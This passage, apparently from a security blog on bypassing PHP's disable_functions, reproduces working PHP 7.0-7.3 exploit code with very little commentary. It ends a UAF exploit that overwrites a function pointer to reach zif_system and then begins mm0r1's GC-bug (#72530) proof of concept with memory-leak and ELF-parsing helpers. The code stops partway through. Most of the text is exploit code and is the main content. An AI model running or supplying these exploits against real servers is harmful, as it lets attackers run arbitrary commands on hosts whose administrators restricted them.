        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;UAF failed.&#39;</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$spl1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MySplFixedArray</span><span class="p">();</span>
        <span class="nv">$spl2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MySplFixedArray</span><span class="p">();</span>

        <span class="c1"># some leaks
</span><span class="c1"></span>        <span class="nv">$class_entry</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x120</span><span class="p">);</span>
        <span class="nv">$handlers</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x128</span><span class="p">);</span>
        <span class="nv">$php_heap</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x1a8</span><span class="p">);</span>
        <span class="nv">$abc_addr</span> <span class="o">=</span> <span class="nv">$php_heap</span> <span class="o">-</span> <span class="mh">0x218</span><span class="p">;</span>

        <span class="c1"># create a fake class_entry
</span><span class="c1"></span>        <span class="nv">$fake_obj</span> <span class="o">=</span> <span class="nv">$abc_addr</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1"># type
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x120</span><span class="p">,</span> <span class="nv">$abc_addr</span><span class="p">);</span> <span class="c1"># fake class_entry
</span><span class="c1"></span>
        <span class="c1"># copy some of class_entry definition
</span><span class="c1"></span>        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> 
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak1</span><span class="p">(</span><span class="nv">$class_entry</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="c1"># fake static members table
</span><span class="c1"></span>        <span class="nv">$fake_tbl_off</span> <span class="o">=</span> <span class="mh">0x70</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">16</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_tbl_off</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_tbl_off</span><span class="p">);</span>

        <span class="c1"># fake zval_reference
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_tbl_off</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_tbl_off</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span> <span class="c1"># zval
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_tbl_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span> <span class="c1"># zval type (reference)
</span><span class="c1"></span>
        <span class="c1"># look for binary base
</span><span class="c1"></span>        <span class="nv">$binary_leak</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$handlers</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$base</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t determine binary base address&#34;</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1"># parse elf header
</span><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$elf</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t parse ELF&#34;</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1"># get basic_functions address
</span><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t get basic_functions address&#34;</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1"># find system entry
</span><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$zif_system</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t get zif_system address&#34;</span><span class="p">);</span>
        <span class="p">}</span>
        
        <span class="c1"># copy hashtable offsetGet bucket
</span><span class="c1"></span>        <span class="nv">$fake_bkt_off</span> <span class="o">=</span> <span class="mh">0x70</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">-</span> <span class="mi">16</span><span class="p">;</span>

        <span class="nv">$function_data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">);</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_bkt_off</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> 
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$function_data</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="c1"># create a fake bucket
</span><span class="c1"></span>        <span class="nv">$fake_bkt_addr</span> <span class="o">=</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_bkt_off</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="nv">$fake_bkt_addr</span><span class="p">);</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1"># copy bucket zval
</span><span class="c1"></span>        <span class="nv">$function_zval</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_bkt_off</span><span class="p">);</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span>  <span class="nv">$fake_bkt_off</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> 
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$function_zval</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="c1"># pwn
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_bkt_off</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">,</span> <span class="nv">$zif_system</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_bkt_off</span><span class="p">,</span> <span class="nv">$fake_bkt_addr</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">);</span>

        <span class="nv">$spl1</span><span class="o">-&gt;</span><span class="na">offsetGet</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>

        <span class="k">exit</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$y</span> <span class="o">=</span> <span class="p">[</span><span class="k">new</span> <span class="nx">Z</span><span class="p">()];</span>
<span class="nx">json_encode</span><span class="p">([</span><span class="o">&amp;</span><span class="nv">$y</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129102149878.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129102149878.png, https://gitee.com/leonsec/images/raw/master/image-20210129102149878.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129102149878.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129102149878.png"
        title="image-20210129102149878" /></p>
<h2 id="gc-bypass">GC Bypass</h2>
<blockquote>
<p>This exploit uses a three year old <a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener noreffer">bug</a> in PHP garbage collector to bypass <code>disable_functions</code> and execute a system command. It was tested on various php7.0-7.3 builds for Ubuntu/CentOS/FreeBSD with cli/fpm/apache2 server APIs and found to work reliably. Feel free to submit an issue if you experience any problems.</p>
<p><a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener noreffer">PHP :: Bug #72530 :: Use After Free in GC with Certain Destructors</a></p>
</blockquote>
<p>影响范围：</p>
<ul>
<li>7.0 - all versions to date</li>
<li>7.1 - all versions to date</li>
<li>7.2 - all versions to date</li>
<li>7.3 - all versions to date</li>
</ul>
<p>exp: <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener noreffer">php7-gc-bypass/exploit.php · mm0r1/exploits</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="c1"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
</span><span class="c1">#
</span><span class="c1"># Bug: https://bugs.php.net/bug.php?id=72530
</span><span class="c1">#
</span><span class="c1"># This exploit should work on all PHP 7.0-7.3 versions
</span><span class="c1">#
</span><span class="c1"># Author: https://github.com/mm0r1
</span><span class="c1"></span>
<span class="nx">pwn</span><span class="p">(</span><span class="s2">&#34;uname -a&#34;</span><span class="p">);</span>

<span class="k">function</span> <span class="nf">pwn</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">;</span>

    <span class="k">function</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$address</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$s</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$address</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
            <span class="nv">$address</span> <span class="o">|=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$address</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">ptr2str</span><span class="p">(</span><span class="nv">$ptr</span><span class="p">,</span> <span class="nv">$m</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$m</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$ptr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
            <span class="nv">$ptr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$v</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$v</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
            <span class="nv">$v</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">;</span>
        <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">+</span> <span class="nv">$p</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$leak</span> <span class="o">%=</span> <span class="mi">2</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$leak</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$e_type</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

        <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
        <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
        <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
            <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
            <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
            <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
            <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>

            <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_Write
</span><span class="c1"></span>                <span class="c1"># handle pie
</span><span class="c1"></span>                <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
                <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_exec
</span><span class="c1"></span>                <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>

        <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
